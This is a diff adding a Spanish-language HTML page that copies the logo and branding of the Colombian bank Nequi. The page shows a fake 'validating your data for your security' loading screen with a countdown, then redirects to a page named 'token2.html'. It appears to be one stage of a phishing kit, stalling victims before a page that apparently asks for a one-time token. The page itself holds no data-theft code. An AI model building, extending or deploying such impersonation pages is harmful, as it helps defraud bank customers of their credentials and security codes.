@@ -1,0 +1,111 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/nequi_one.webflow.css">
+    <link rel="stylesheet" href="css/nequi_two.webflow.css">
+    <link rel="stylesheet" href="css/normalize.css">
+    <style>
+            body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f1bfda;
+        }
+
+        .loading-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(32,0,32,.91);;
+            z-index: 9999; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        #countdown {
+    font-weight: bold;
+    color: #da0081;
+}
+
+        .loading {
+            background-color: #fff; 
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center; 
+            font-family: Arial, sans-serif; 
+        }
+
+        .loading-image {
+            max-width: 200px; 
+            margin-bottom: 20px; 
+        }
+
+        .loading-text {
+            font-size: 16px;
+            color: black;
+            margin-bottom: 10px;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #da0081; 
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite; 
+            margin: 0 auto; 
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+<script type="text/javascript">
+    window.hasMobileFirstExtension = true;</script></head>
+<body>
+
+<header class="ng-scope"> <div class="wrap-header" bis_skin_checked="1"> <div class="row" bis_skin_checked="1"> <div class="col-xs-12 col-md-2" bis_skin_checked="1"> <div class="logo" bis_skin_checked="1"> <a href="https://www.nequi.com.co" bis_skin_checked="1"> <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg"> </a> </div> <div class="btn-menu-hamburguer" ng-click="openMenu();" bis_skin_checked="1"> <a class=""> <span></span> </a> </div> </div> <div class="col-xs-12 col-md-10 container-buttons" bis_skin_checked="1"> <div class="wrap-main-menu " bis_skin_checked="1">  </div> </div> </div> </div> </header>
+    
+<div class="loading-container">
+    <div class="loading">
+        <img src="images/neq.png" alt="Imagen de carga" class="loading-image">
+        <!-- Texto dentro del div de carga -->
+        <div class="loading-text">Espera un momento por favor. Estamos procesando la información y validando los datos por tu seguridad...
+        </div>
+        <div class="loading-spinner" style="
+    margin-bottom: 20px;
+"></div>
+
+    <span id="countdown">Tiempo estimado: 20 segundos</span>
+    </div>
+</div>
+
+
+<script>
+    // Función para iniciar el contador regresivo
+    function startCountdown(seconds) {
+        var countdownElement = document.getElementById('countdown');
+        var intervalId = setInterval(function() {
+            seconds--;
+            countdownElement.textContent = 'Tiempo estimado: ' + seconds + ' segundos';
+            if (seconds <= 0) {
+                clearInterval(intervalId);
+                // Redirigir a otra página cuando el contador llegue a cero
+                window.location.href = "token2.html";
+            }
+        }, 1000);
+    }
+
+    // Iniciar el contador regresivo con 10 segundos
+    startCountdown(10);
+</script>
+
+
+
+</body></html>
